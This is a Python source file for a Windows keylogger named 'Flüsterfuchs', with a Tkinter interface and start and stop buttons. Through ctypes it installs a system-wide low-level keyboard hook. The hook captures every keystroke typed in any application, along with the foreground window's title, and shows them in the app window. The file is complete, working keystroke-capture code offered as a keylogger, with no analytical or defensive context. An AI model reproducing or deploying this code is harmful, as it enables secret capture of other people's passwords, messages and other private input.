from ctypes import *
from ctypes import wintypes
from tkinter import Tk, Text, Scrollbar, Button, Frame, Label
import random

user32 = windll.user32

LRESULT = c_long
WH_KEYBOARD_LL = 13

WM_KEYDOWN = 0x0100
WM_RETURN = 0x0D
WM_SHIFT = 0x10

GetWindowTextLengthA = user32.GetWindowTextLengthA
GetWindowTextLengthA.argtypes = (wintypes.HANDLE,)
GetWindowTextLengthA.restype = wintypes.INT

GetWindowTextA = user32.GetWindowTextA
GetWindowTextA.argtypes = (wintypes.HANDLE, wintypes.LPSTR, wintypes.INT)
GetWindowTextA.restype = wintypes.INT

GetKeyState = user32.GetKeyState
GetKeyState.argtypes = (wintypes.INT,)
GetKeyState.restype = wintypes.SHORT

Keyboard_state = wintypes.BYTE * 256
GetKeyboardState = user32.GetKeyboardState
GetKeyboardState.argtypes = (POINTER(Keyboard_state),)
GetKeyboardState.restype = wintypes.BOOL

ToAscii = user32.ToAscii
ToAscii.argtypes = (wintypes.UINT, wintypes.UINT, POINTER(Keyboard_state), wintypes.LPWORD, wintypes.UINT)
ToAscii.restype = wintypes.INT

CallNextHookEx = user32.CallNextHookEx
CallNextHookEx.argtypes = (wintypes.HHOOK, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)
CallNextHookEx.restype = wintypes.INT

HOOKPROC = CFUNCTYPE(LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)

SetWindowsHookExA = user32.SetWindowsHookExA
SetWindowsHookExA.argtypes = (wintypes.INT, HOOKPROC, wintypes.HINSTANCE, wintypes.DWORD)
SetWindowsHookExA.restype = wintypes.HHOOK

GetMessageA = user32.GetMessageA
GetMessageA.argtypes = (wintypes.LPMSG, wintypes.HWND, wintypes.UINT, wintypes.UINT)
GetMessageA.restype = wintypes.BOOL

class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [("vkCode", wintypes.DWORD),
                ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", wintypes.DWORD)]

def get_foreground_process():
    hwnd = user32.GetForegroundWindow()
    length = GetWindowTextLengthA(hwnd)
    buff = create_string_buffer(length + 1)
    GetWindowTextA(hwnd, buff, length + 1)
    return buff.value

last = ""
process_colors = {}


def hook_function(nCode, wParam, lParam):
    global last, process_colors
    current_process = get_foreground_process()

    if last != current_process:
        last = current_process

        if last not in process_colors:
            process_colors[last] = "white"

        output_text.insert("end", f"\n [{last.decode('latin-1')}] ===> ", ("app_name",))
        output_text.tag_config("app_name", foreground=process_colors[last])

    if wParam == WM_KEYDOWN:
        keyboard = KBDLLHOOKSTRUCT.from_address(lParam)

        state = (wintypes.BYTE * 256)()
        GetKeyState(WM_SHIFT)
        GetKeyboardState(byref(state))

        buf = (c_ushort * 1)()
        n = ToAscii(keyboard.vkCode, keyboard.scanCode, state, buf, 0)

        if n > 0:
            if keyboard.vkCode == WM_RETURN:
                output_text.insert("end", "\n", ("app_name",))
            else:
                output_text.insert("end", string_at(buf).decode("latin-1"), ("app_input",))

    return CallNextHookEx(hook, nCode, wParam, lParam)

HookProcType = CFUNCTYPE(LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)
hook_function_cfunc = HookProcType(hook_function)

def start_hook():
    global hook
    hook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_function_cfunc, 0, 0)
    start_hook_button.config(state="disabled")
    stop_hook_button.config(state="normal")

def hide_ascii_logo():
    ascii_logo_label.pack_forget()

def stop_hook():
    global hook
    user32.UnhookWindowsHookEx(hook)
    start_hook_button.config(state="normal")
    stop_hook_button.config(state="disabled")

# GUI setup
root = Tk()
root.title("Flüsterfuchs")
root.geometry("850x750")
root.config(bg="#1E1E1E")
root.iconbitmap('./icon.ico')

# Display ASCII logo
ascii_logo = """
                                                                                          
                                                                                          
                                                                                          
                                                                                          
                                    .::--===++++===--:..                                  
                               .-===--:::::---===+++++++++=:.                             
                           .:--:.   ..::---------==+++++++++++=:.                         
                   .      ..                .         .:-=++++++++-                       
                   -+++=:                   ++++=:          :-++++++=:                    
                   :++++++=                 :++++++-            :=+++++:                  
                  -+++++++++:                ++++++++.             :++++=.                
                .++++++++++++.               =+++++++++======-::.    .=+++-               
               -++++++++++++++             :-+++++++++++++++++++++=-:  .=++=              
              =+++++++++++++++.         .=++++++++++++++++++++++++++++=: :+++             
            .+++++++++++++++++.        =++++-:.-=++++++++++++++++++++++++- -+=            
            ++++++++++++++++++       :++++=:.:=++++++++++++++++++++++++++++::+=           
           ++++++++++++++++++=      -+++++++++++++++++++++++++++++++++++++++=:+:          
          -++++++++++++++++++     .+++++++++++++++++++++++++++++++++++++++++++:=          
          ++++++++++++++++++:   :=+++++++++++++++++++++++++++++++++++++++++++++:          
         -+++++++++++++++++- :-++++++++++++++++====--==+++++++++++++++++++++++++          
         ++++++++++++++++++  .=+++++++==--::.           ..-=++++++++++++++++++++-         
         +++++++++++++++++:                   .             .=+++++++++++++++++++         
        .+++++++++++++++++                             .     .==+++++++++++++++++         
        .+++++++++++++++++                                    .+++++++++++++++=         
         +++++++++++++++++                               .      .++++++++++++++++         
         +++++++++++++++++                                      .+++++++++++++++=          
         :+++++++++++++++++                                  :++++++++++++++++           
           =+++++++++++++++++                               .=+++++++++++++++=            
            =+++++++++++++++++:                            .:=++++++++++++++-             
             =+++++++++++++++++=.                        .:=++++++++++++++=.              
              -++++++++++++++++++=:                  ..-=+++++++++++++++-. .              
               :+++++++++++++++++++++=-.  .:-=++++++++++++++++=-:. :-+=               
                 =+++++++++++++++++++++=-:...:.:.::.  .:.:.:-=+++=.                  
                  .=+++++++++++++++++++++++++-....:-=+++++++++-.                    
                    .-++++++++++++++++++++++++++++++++++++++++++-.                    
                       :=+++++++++++++++++++++++++++++++++++:                       
                          :=+++++++++++++++++++++++++++++++++++:                          
                             .:=++++++++++++++++++++++++++=:                             
                                  .:--==++++++++++==--:.                                 
                                                                                          
                                                                                          
                                                                                          
                                                                                    
    """

root.after(1000, hide_ascii_logo)

ascii_logo_label = Label(root, text=ascii_logo, font=("Courier", 12), bg="#1E1E1E", fg="#FF7F00")

header_label = Label(root, text="Flüsterfuchs", font=("Papyrus", 50, "bold"), bg="#1E1E1E", fg="#FF7F00")
ascii_logo_label.pack(pady=(50, 15))
header_label.pack(pady=(0, 10))

# Output Text
output_text = Text(root, wrap="word", state="normal", height=15, width=60, bg="#1E1E1E", fg="#FF7F00",
                   insertbackground="white", selectbackground="#61dafb", bd=0, font=("Helvetica", 16))
output_text.pack(expand=True, fill="both", padx=20, pady=(0, 10))

scrollbar = Scrollbar(root, command=output_text.yview, bg="#1E1E1E", troughcolor="#1E1E1E")
scrollbar.pack(side="right", fill="y")

output_text["yscrollcommand"] = scrollbar.set

# Buttons
button_frame = Frame(root, bg="#1E1E1E")
button_frame.pack(pady=(0, 30))

start_hook_button = Button(button_frame, text="Start Keylogger", command=start_hook, bg="#FF7F00", fg="white",
                           relief="flat", font=("Papyrus", 15, "bold"), padx=10, pady=5, state="normal")
start_hook_button.pack(side="left", padx=10)

stop_hook_button = Button(button_frame, text="Stop Keylogger", command=stop_hook, bg="#FF7F00", fg="white",
                          relief="flat", font=("Papyrus", 15, "bold"), padx=10, pady=5, state="disabled")
stop_hook_button.pack(side="right", padx=10)

root.mainloop()
